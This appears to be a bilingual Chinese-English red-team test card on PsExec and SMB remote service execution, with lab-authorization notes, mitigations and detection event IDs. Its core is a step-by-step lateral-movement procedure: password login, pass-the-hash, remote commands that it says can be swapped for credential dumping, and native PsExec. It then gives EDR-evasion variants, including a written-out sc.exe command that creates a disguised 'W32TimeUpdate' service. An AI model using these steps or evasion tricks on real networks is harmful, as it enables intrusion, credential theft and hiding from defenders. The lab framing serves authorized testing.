prerequisites.zh: 确认 PsExec/SMB 远程服务边界验证 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for PsExec and SMB Remote-Service Boundary Validation are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: PsExec/SMB 远程服务边界验证覆盖 SMB 远程执行场景：针对拿到有效凭据或 NTLM 哈希的测试主体，验证能否经 445 端口在目标主机创建服务并执行命令。验证维度涵盖明文密码、哈希传递、远程单命令执行与原生 PsExec 四种入口。
overview.en: PsExec/SMB Remote-Service Boundary Validation covers SMB remote execution: for a test principal holding valid credentials or an NTLM hash, verify whether a service can be created on the target via port 445 to execute commands. Verification dimensions cover plaintext password, pass-the-hash, single remote command, and native PsExec entries.

vulnerability.zh: 根因是 SMB 服务与管理共享（ADMIN$）允许特权主体远程创建并启动服务，服务进程继承 SYSTEM 权限；弱口令、NTLM 哈希泄露或本地管理员凭据复用，使攻击者绕过交互式登录直接在目标侧执行任意命令。
vulnerability.en: The root cause is that the SMB service and the ADMIN$ share let privileged principals remotely create and start services whose processes inherit SYSTEM; weak passwords, leaked NTLM hashes, or reused local-admin credentials let an attacker execute arbitrary commands on the target without interactive logon.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用实验账号密码建立 psexec 交互 shell，whoami 显示目标用户上下文且目标侧出现 7045 服务创建事件即确认成功；第 2 步改用 -hashes 以 NTLM 哈希认证，目标记录 4624 NTLM 登录即确认哈希可用；第 3 步远程执行 whoami 验证命令回传；第 4 步用原生 PsExec.exe 复现并确认临时服务创建后被清理。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 establishes an interactive psexec shell with the lab account password — whoami returning the target context plus a 7045 service-creation event on the target confirms success; step 2 switches to -hashes for NTLM authentication — a 4624 NTLM logon recorded on the target confirms the hash works; step 3 executes whoami remotely to verify command return; step 4 replays with native PsExec.exe and confirms the temporary service is cleaned up. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 限制 445 端口仅管理网段可达，启用 SMB 签名与 EPA，实施本地管理员隔离并用 LAPS 轮换本机管理员密码，建立分层管理账号；对 7045 服务创建与 4624 异常登录实时告警。修复后用第 1、2 步样例回归，远程服务创建应被拒绝并触发告警。
mitigation.en: Restrict port 445 to the management segment, enable SMB signing and EPA, enforce local administrator isolation with LAPS rotation, and adopt tiered admin accounts; alert in real time on 7045 service creation and anomalous 4624 logons. After the fix, regress with the step 1 and step 2 samples: remote service creation must be denied and raise an alert.

title.zh: 口令登录建立远程执行

description.zh: 用 psexec.py 以域账号口令登录目标；返回 SYSTEM 交互 shell 即远程服务执行通道打通，可执行任意命令。
description.en: Log into the target with psexec.py using domain credentials; a SYSTEM interactive shell means the remote service execution channel is open.

description.zh: 改用 -hashes 传入 NTLM 哈希登录同批主机；无需明文口令拿到 shell 即哈希可复用，覆盖只有哈希的场景。
description.en: Switch to -hashes with the NTLM hash for the same fleet; shells without the plaintext password prove hash reuse and cover hash-only situations.

title.zh: 定向执行命令收割结果
title.en: Run targeted commands to harvest results

description.zh: 在登录命令后追加 whoami 等指令；回显 SYSTEM 上下文即确认执行身份，可批量替换为凭据收集与侦察命令。
description.en: Append commands like whoami after the login; a SYSTEM context echoed back confirms the execution identity and can be swapped for credential dump and recon commands.

title.zh: 原生 PsExec 落地横向

description.zh: 在跳板机用 PsExec.exe \目标 -u 域\账号 -p 口令 启动 cmd.exe；新 shell 属于目标主机即完成原生工具横向，动作仅表现为服务安装。
description.en: From the pivot host run PsExec.exe \\target -u domain\user -p password to launch cmd.exe; the new shell belonging to the target completes native lateral movement, visible only as service installation.

analysis.zh: PsExec/SMB 远程服务边界验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: PsExec and SMB Remote-Service Boundary Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 只验证实验主机 445 端口、服务控制管理器 ACL 与日志，不创建服务或执行远程命令。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

description.zh: 绕过对默认服务名（如 XYZ/BTOBUTO/随机大写串）的 EDR 特征：伪装为系统管理风格服务名。成功判据：半交互 shell 建立且服务名不在检测名单。
description.en: Evades EDR signatures on default random-caps service names by masquerading as a sysadmin-style name. Success: semi-interactive shell establishes with a service name off detection lists.

description.zh: 绕过 admin$ 二进制落盘检测（PSEXESVC.exe 落盘告警）：SMBExec 经服务批处理执行不落盘。成功判据：shell 可用且目标无新 EXE 落盘。
description.en: Evades admin$ binary drop detection (PSEXESVC.exe landing alerts) since SMBExec executes via service batches without dropping a binary. Success: shell works and no new EXE lands on the target.

title.zh: 原生 sc.exe 组合规避变体

wafBypass.command: sc \\{LAB_HOST} create W32TimeUpdate binPath= "cmd /c whoami > C:\Windows\Temp\o.txt" && sc \\{LAB_HOST} start W32TimeUpdate && sc \\{LAB_HOST} delete W32TimeUpdate

description.zh: 绕过 impacket 脚本流量指纹：全程原生 sc.exe 创建/启动/删除，动作分散于三个低噪操作。成功判据：服务启动成功且 o.txt 生成。
description.en: Evades impacket script traffic fingerprints by doing everything with native sc.exe create/start/delete spread across three low-noise operations. Success: service starts and o.txt appears.

Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.
